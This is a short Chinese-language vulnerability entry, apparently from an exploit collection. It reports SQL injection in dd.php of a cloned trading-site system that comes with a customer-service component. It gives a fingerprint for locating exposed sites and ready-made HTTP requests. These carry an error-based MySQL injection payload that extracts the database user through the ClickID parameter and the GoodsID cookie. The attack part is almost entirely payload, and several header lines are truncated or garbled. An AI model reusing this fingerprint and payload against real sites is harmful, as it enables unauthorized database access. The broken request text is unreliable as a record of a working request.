# 仿转转交易猫⼗六合⼀⾃带客服系统dd.php存在SQL注入漏洞

- **系统**：仿转转交易猫⼗六合⼀⾃带客服系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`header="Location: [http://www.baidu.com"`
- **请求**：`GET /dlmm/dd.php?ClickID=' AND GTID_SUBSET(CONCAT((MID((IFNULL(CAST(USER`

**请求体 / payload**
```
() AS NCHAR),0x20)),1))),9423)-- c HTTP/1.1
mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cookie: PHPSESSID=bu8chm3gmcfutb01uaam0h49p1
Host: 127.0.0.1
bKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36
3"
sec-fetch-user: ?1
GET /dlmm/dl.php HTTP/1.1
mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cookie: GoodsID=1' AND GTID_SUBSET(CONCAT((MID((IFNULL(CAST(USER() AS NCHA
R),0x20)),1))),9423)-- c
Host: 127.0.0.1
(KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
3"
sec-fetch-user: ?1
```
- **预期**：200　|　—